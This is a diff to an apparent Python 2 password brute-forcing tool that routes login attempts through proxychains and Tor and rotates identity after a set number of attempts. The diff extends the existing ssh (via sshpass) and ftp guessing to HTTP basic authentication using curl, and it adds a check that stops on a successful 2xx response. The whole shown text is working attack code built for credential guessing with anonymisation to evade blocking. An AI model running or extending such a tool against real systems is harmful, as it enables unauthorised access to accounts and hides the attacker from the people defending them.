@@ -76,7 +76,7 @@ def argvcontrol():
 	parser.add_argument("-a","--attempts", help="Number of attempts before identity change", default="3")
 	parser.add_argument("-w","--wait", help="Waiting time after Tor service restart (in seconds)", default="1")
 	parser.add_argument("-o","--timeout", help="Timeout for each attempt (in seconds)", default="30")
-	parser.add_argument("-s","--service", help="The targeted service: ssh, ftp", default='ssh')
+	parser.add_argument("-s","--service", help="The targeted service: ssh, ftp, http", default='ssh')
 	parser.add_argument("-t","--test", help="Use the to test dependences", action='store_true', default=False)
 	args = parser.parse_args()
 
@@ -108,8 +108,8 @@ def argvcontrol():
 	if not positiveNumberValidation(args.timeout):
 		print "[!] Timeout invalid"
 		valid = False
-	if args.service != "ssh" and args.service != "ftp":
-		print "[!] Invalid service, choose between: ssh, ftp"
+	if args.service != "ssh" and args.service != "ftp" and args.service != "http":
+		print "[!] Invalid service, choose between: ssh, ftp, http"
 		valid = False
 
 	return valid, args
@@ -190,12 +190,20 @@ def main():
 					var = 'proxychains sshpass -p ' + password + ' ssh -o StrictHostKeyChecking=no ' + user + '@' + ip + ' -p ' + port
 				elif service == "ftp":
 					var = 'proxychains ftp ftp://' + user + ':' + password + '@' + ip
+				elif service == "http":
+					var = 'proxychains curl -i -sSu ' + user + ':' + password + ' ' + ip
 				var_list = var.split(' ')
 
 				try:
-					print '[*] ' + var
-					subp = subprocess.Popen(var_list)
+					print '[*] Running Command: ' + var
+					subp = subprocess.Popen(var_list, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 					wait_timeout(subp, timeout)
+					out, err = subp.communicate()
+					print '[*] Process Output:\n' + out, err
+					# Specific check for HTTP (does not conflict with ssh, ftp)
+					if out.find("HTTP/1.1 2") >= 0:
+						print '[*] Found successful HTTP response with:\n' + var
+						exit()
 					print '[!] Returned Status Code: ' + str(subp.returncode)
 					c += 1
 				except RuntimeError:
